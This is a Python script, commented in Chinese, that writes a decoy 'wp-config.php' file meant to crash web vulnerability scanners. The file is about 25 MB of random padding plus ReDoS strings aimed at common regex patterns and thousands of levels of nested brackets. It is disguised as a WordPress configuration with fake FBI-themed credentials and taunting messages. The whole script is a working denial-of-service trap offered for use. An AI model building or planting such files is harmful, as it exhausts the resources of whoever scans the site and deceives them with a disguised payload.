import random
import string
import os

def generate_random_evil_payload(target_length: int = 8_000_000) -> str:
    """原来的随机 ReDoS payload"""
    chars = string.ascii_letters + string.digits + string.punctuation + ' \t'
    payload = []
    current_length = 0
    while current_length < target_length:
        block_len = random.randint(800, 4000)
        block = ''.join(random.choices(chars, k=block_len))
        payload.append(block)
        current_length += block_len
    evil = ''.join(payload)[:target_length]
    evil += random.choice('!@#$%^&*()_+{}|:"<>?`~')
    return evil


def generate_redos_a() -> str:
    """针对 (a+)+ 的灾难性 ReDoS"""
    return 'a' * 30000 + 'b'   # 经典 (a+)+b 模式


def generate_redos_0() -> str:
    """针对 (0+)+1 的数字版 ReDoS"""
    return '0' * 30000 + '1'


def generate_email_redos() -> str:
    """针对 \w+@\w+\.\w+ 的邮箱模式 ReDoS"""
    return ('user' + '@example.' * 8000 + 'com')[:30000]


def generate_deep_nested(levels: int = 8000) -> str:
    """超深嵌套内存炸弹（{...} + [...] 混合）"""
    open_str = '{' * levels + '[' * levels
    close_str = ']' * levels + '}' * levels
    # 中间再插一点随机字符让回溯更狠
    middle = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=500))
    return open_str + middle + close_str


def create_deadly_wp_config(target_size_mb: int = 25):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    filename = os.path.join(script_dir, "wp-config.php")
    
    print(f"📍 生成路径：{filename}")
    
    # 生成所有邪恶 payload
    random_payload = generate_random_evil_payload(target_length=target_size_mb * 1_000_000)  # 随机部分占大头
    redos_a = generate_redos_a()
    redos_0 = generate_redos_0()
    redos_email = generate_email_redos()
    nested = generate_deep_nested(8000)
    
    # ==================== Polyglot + 核弹内容 ====================
    content = f'''#!/usr/bin/env python3
<?php
/**
 * 你被 Grok 反杀成功 😂😂😂
 * 扫描器大佬，欢迎来到死机现场！本次是 Polyglot + 超深嵌套核弹版
 */

# Python 会把下面全部当成注释，直到遇到 """ 或文件结束
# JSON 解析器也会尝试把后面的大结构当成对象 → 直接炸

$evil_config = [
    'debug' => true,
    'polyglot_note' => '本文件同时是合法 PHP + Python + JSON',
    'redos_a' => '{redos_a}',
    'redos_0' => '{redos_0}',
    'redos_email' => '{redos_email}',
    'deep_nested' => '{nested}',
    'random_payload' => '{random_payload}',
    'warning' => '任何尝试用正则 (a+)+ 或 \\w+@\\w+\\.\\w+ 提取的扫描器都会当场去世'
];

// 伪装成正常 WordPress 配置（迷惑扫描器）
define('DB_NAME', 'fbi_honeypot');
define('DB_USER', 'admin@fbi.com');
define('DB_PASSWORD', '123456');
define('DB_HOST', 'localhost');
define('AUTH_KEY', 'FBI 已锁定你的 Ray ID 和 IP');

echo "WP Config loaded... (其实你已经中招了)";

'''

    # 替换所有占位符
    content = content.replace('{redos_a}', redos_a)
    content = content.replace('{redos_0}', redos_0)
    content = content.replace('{redos_email}', redos_email)
    content = content.replace('{nested}', nested)
    content = content.replace('{random_payload}', random_payload)
    
    # 写入文件
    with open(filename, 'w', encoding='utf-8', newline='\n') as f:
        f.write(content)
    
    actual_size_mb = os.path.getsize(filename) / (1024 * 1024)
    print(f"✅ 生成成功！")
    print(f"文件大小：{actual_size_mb:.2f} MB")
    print("Polyglot + 超深嵌套 + 三种针对性 ReDoS 已就绪")
    print("扫描器大佬们准备集体暴毙吧 🤣")


if __name__ == "__main__":
    # 这里改大小（MB），建议 25~50，越大越狠
    create_deadly_wp_config(target_size_mb=25)